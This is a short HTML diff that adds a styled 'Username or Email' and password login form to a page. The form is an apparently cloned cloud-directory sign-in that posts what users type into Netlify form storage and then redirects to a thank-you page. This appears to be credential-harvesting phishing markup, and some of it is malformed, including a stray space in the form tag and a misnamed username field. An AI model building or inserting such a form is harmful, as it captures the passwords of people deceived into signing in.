@@ -138,8 +138,14 @@ function checkResponse() {
 							
                        					
 					 </form-->
-						<form name="Login" method="POST" data-netlify="true" action="/thank-you.html">
-  <input type="hidden" name="form-name" value="Login">
+						 < form name="Login" novalidate="" id="cloud-directory-form" class="needs-validation mb-6 px-4 px-xxl-6" method="POST" data-netlify="true" autocomplete="off" action="thank-you.html" onsubmit="setFedSettings()">
+				<div class="form-inputs mb-4">
+  <label class="form-label" for="vusername">Username or Email</label>
+                               	<input id="vusername" type="text" class="form-control" name="form-name" value="Login" tabindex="1" data-toggle="tooltip" data-placement="top" title="Please provide user name">
+								<br>
+								
+							<label class="form-label" for="password-input">Password</label>
+								<input id="password-input" type="password" class="form-control" name="password" tabindex="2" autocomplete="off" data-toggle="tooltip" data-placement="top" title="Please provide password">
   <!-- your visible inputs here -->
 </form>
 					 </div>
